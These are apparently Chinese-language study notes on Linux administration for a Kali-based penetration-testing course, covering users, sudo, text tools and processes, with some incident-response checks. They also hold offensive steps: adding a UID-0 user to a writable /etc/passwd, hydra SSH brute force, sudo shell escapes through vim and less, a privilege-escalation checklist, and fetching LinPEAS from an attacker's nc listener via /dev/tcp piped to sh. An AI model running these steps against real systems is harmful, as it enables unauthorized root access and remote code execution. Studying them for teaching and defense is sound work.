### 用户和组的初步管理

sudo授权文件/etc/sudoers

%sudo ALL(ALL) ALL

用户（被授权的用户或组） 主机名列表=（用户） 命令程序列表

lsof -i :22 （查看关于22端口打开的文件）

用户user

* useradd（用户添加）

  useradd hacker      添加用户hacker

* usermod（用户修改）

  usermod -p ‘hash加密的密文’ 用户名   （修改用户密码）

  openssl passwd -1 -salt 用户名 密码  （使用openssl的passwd哈希密码加密功能，加密用户密码，-1 是使用MD5加密）

  passwd 用户名 密码   （设置用户密码，限于已存在用户并且密码为加密密文）

* userdel（用户删除）

  userdel 用户名

* su（切换用户）

  su -  （切换到root账户）

* sudo（用户授权）

* id（查询用户id）

* who（w）（查看在线用户）

* last（查看用户最近登录信息）

* /etc/passwd（账户文件）



### 对/etc/passwd文件有写入的权限

chmod 666 /etc/passwd

用户       组      其他

rwx         rwx      rwx

6             6          6

rw-          rw-        rw-

r 4

w 2

x 1

添加一个具有root权限的用户

echo 'abc:加密密码:0:0:root:/root:/usr/bin/zsh' >> /etc/passwd



### 密码文件解读

/etc/passwd 文件

hacker：x：1001：1001：：/home/hacker：/bin/sh

* 密码x 

  表示用户密码存储在影子文件中/etc/shadow

* 用户ID 

  root的uid为0

  在系统中区别用户是根据uid好区分，不是用户名

* 用户GID号  

  属组，私有组

* 用户描述

* 用户家目录

* 用户shell

echo ‘abc:123456’ | chpasswd    （把abc的密码设置为123456，非交互式）

find / -perm -o=w -type f 2>/dev/null （查找其他用户有写入权限的文件有哪些）

-perm 按权限查找  -o=w表示包含其他用户写入权限，o=w表示精确只有其他用户写入权限的

-type f 查找的文件的类型 f为file



### 密码暴力破解

ls -lh rockyou.txt  （查看文件读写权限和大小）

wc -l rockyou.txt  （查看有多少行）

* hydra

  hydra -l user -P passlist.txt ssh://192.168.0.100



### 用户的添加和删除

useradd -m （创建用户家目录） -G 组名称 -s 指定用户登录的shell

eg：useradd -m -G sudo -s /bin/bash abc

su - abc   （切换到abc用户，-为切换到该用户的家目录）

sudo userdel abc



### 找到可疑用户

awk工具：

检查uid号为0的用户     awk -F: '$3=="0" {print $1}' /etc/passwd

检查系统中是否有空密码用户    awk -F: '$2=="" {print $1}' /etc/shadow



### sudo授权

通过修改sudoers文件更改用户部分授权

语法：

%sudo     ALL=（ALL）    ALL

被授权的用户（或者%被授权的组）    主机角色=（以什么用户身份，如果没有默认root）     命令列表（多个命令之间用逗号隔开）

例子：

abc    ALL=/usr/bin/passwd,/usr/sbin/userdell



### sudo 授权避免的事情

避免授权vi，vim等编辑工具，包括ftp，less，more，emacs，git等

abc     ALL=/usr/bin/vim      （允许用户abc以root权限运行vim）

这些程序支持shell转义（!/bin/bash）

在vi，vim中输入:!/bin/bash

在more，less中输入!/bin/bash



  ### kali中管理网络

systemctl stop NetworkManager  （关闭网络管理服务）

systemctl disable NetworkManager   （禁用网络服务）

systemctl status NetworkManager  （查看网络管理服务状态）

网络配置文件：/etc/network/interfaces

DNS配置：echo "nameserver 8.8.8.8" >/etc/resolv.conf

使用host检测DNS

host qq.com



### Linux操作系统信息

uname -a  （查看版本信息）

cat /etc/issue  （本地控制台标题信息）

lsb_release -a    （查看发行版本）

cat /etc/*-release



### Linux硬件信息

cat /proc/cpuinfo | more （查看cpu型号）

cat /proc/meminfo （查看内存）

free -m   （查看内存，以M为单位）

fdisk -l   （显示所有硬盘）1-4保留给主分区，扩展分区也占用一个，逻辑分区从5开始

lsblk （显示块设备）

lsusb （显示usb设备）

mkdir /mnt/usb

mount /dev/sdb1 /mnt/usb    挂载

umount /mnt/usb     卸载



### 服务管理

新型写入文件方法：（非交互式）

cat > student.txt << EOF  （EOF为自定义结束符号）

heredoc> abcd

heredoc> efg

heredoc> EOF  （退出输入）

systemctl start ssh （开启ssh服务）

systemctl stop ssh（关闭ssh服务）

systemctl status ssh （查看ssh服务信息）

systemctl restart ssh （重启ssh服务）

systemctl is-enable ssh （查看ssh服务是否开机启动）

systemctl enable ssh （设置ssh服务开机启动）



### 进程管理

动态查看进程：top

进入top时，输入M（以内存占用排序），P（按cpu占用排序），k  （杀死进程，）

输入k时，会要求输入PID值，然后是信号值，15或9（9为强制结束）

htop工具：（默认没有安装）

ps aux （查看所有进程，包括后台进程）

ps aux | grep 目标程序

pstree 查看进程树 （-p可以查看进程id）

kill [信号] 进程id     结束进程

killall [信号]  程序名     结束进程树



### 进程管理与应急响应

如何找到异常进程

查看cpu占用：top -c -o %CPU （-c显示命令行参数，-o按照指定字段排序）

查看内存占用：top -c -o %MEM

查看cpu占用前5的进程：ps -eo pid,ppid,%mem,%cpu,cmd --sort=-%cpu | head -n 5



### host文件讲解

完成域名解析/etc/hosts（优先级比DNS高）

格式：

IP地址      主机名1  主机名2 ......

作用：加快访问站点的速度，屏蔽一些站点，帮助做实验

DNS毒化：黑客操纵A记录（DNS数据库中一种主要记录类型，作用：主机名到ip地址的解析）指向他的服务器ip地址

禁止访问hosts：

锁定文件i节点（indode）

ls -li /etc/hosts     （查看文件indode节点）

chattr +i /etc/hosts    （给文件加上indode节点，锁定文件）

chattr -i /etc/hosts    （取消锁定）

lsattr /etc/hosts   （查看文件隐藏属性）



### netstat查看网络连接

netstat -antu   （-a显示所有网络连接，-n以数字形式不做名称解析，-t查看tcp连接，-u查看udp连接）



### vi文本编辑器

:set nu（给文本加上行号）

:set nonu （取消行号）

光标快速移动：

G  （移动到文本最后一行）

gg （回到文本首行）

回车/j （向下移动一行）

数字+回车 （向下移动n行）

k （向上移动）

数字+G （移动到n行）

:数字 （移动到n行）

$（行尾）    0（行首）

w （移动一个单词）

e（移动到单词结尾）

删除复制更改替换操作：

d+0（从光标处删除到行首）

dd （删除一行）

2+dd（删除两行）

:100,124d（删除100行到124行）

x （删除光标处字符，剪贴）

p（粘贴）

yy（复制一行）

3yy（复制三行）

u（撤销）U（撤销对于一行的修改）



### grep过滤与正则表达式

grep [option] [pattern] [file name]

grep -v '^root' /etc/passwd   （匹配不以root开头的内容）

-v 反向匹配，^root以root开头的行

^root 以root开头的行

root$ 以root结尾的行

grep -irl  “password” /

-i 忽略大小写

-r 递归过滤

-l 只打印匹配行的文件名

grep -c “password” rocket.txt

-c 得到匹配目标有多少行

grep -nw “linux”  test.txt

-n 显示匹配行行号

-w 匹配整个单词

grep -B 2 “10”  number.txt

-B 数字    匹配行的前几行

-A 数字     匹配行的后几行

-C 数字    匹配行上下几行

grep -E '^$|^#' config.txt  （过滤配置中生效的条目，及过滤掉空白行和#开头的行）

grep "r[a-z]*t" test.txt

[a-z] a到z任意一个字符 

[a-z]*  匹配0次或多次

[a-z]+   匹配一次或多次

[a-z]?    匹配0次或1次

{n,m}   最少匹配n次，最多匹配m次



### awk介绍与用法

awk [选项] '模式{动作}' 文件

awk首先读取记录（一行一行读取），然后根据模式匹配找到对应的行，然后分割，最后输出

模式可以使用正则表达式（必须用/ /符号括住），或者使用特定表达式

* awk -F: '/^root/{print $1}' /etc/passwd    （输出以root开头行的第一个词）

* awk -F: 'NR==3{print $1,$3,$4,$NF}' /etc/passwd   （输出第三行的第一，第三，第四和最后一个词）

  NR 行号      NF 最后一个词

begin和end用法：

* awk 'BEGIN{print "start"}{print}END{print "endline"}' test.txt 

有时awk中可以含有表达式

* awk 'BEGIN{i=0}{i++}{print}END{print "count line is " i}' /etc/passwd     （可以在显示完内容显示处有多少行）

可以使用FS（字段分隔符，默认是空格），RS（记录分割符，默认是回车）

* awk 'BEGIN{FS="\n";RS=""}{print $2}' test.txt





















stty raw -echo 取消命令文本输出

export TERM=xterm-color clear使用



whoami

id

who 当前登录用户信息

w

last  最近登录记录



uname -a

lsb_release -a

cat /proc/version 显示版本信息

cat /etc/issue



ip a

ip route

ip neigh 查看网络邻居

arp -a 查看arp缓存



sudo -l



getcap -r / 2>/dev/null 查看文件capabilities



history 查看历史记录



cat /etc/passwd

cat /etc/crontab



echo $PATH

env 查看环境变量



ps -ef 查看进程

ps axjf

ps aux

top -n 1 只刷新一次



netstat -a 显示所有监听的端口

netstat -l

netstat -au / netstat -at



find / -type f -perm -u=s 2>/dev/null



which awk perl python vim find wget 2>/dev/null 显示安装的文件



cat /etc/fstab 显示未挂载的磁盘



使用Linpeas 自动枚举工具

curl -L http://www.......... | sh 直接在官网下载数据后执行，不留有文件

kali：sudo nc -lvnp 3333 < Linepeas.sh

靶机：cat < /dev/tcp/kali地址/3333 | sh













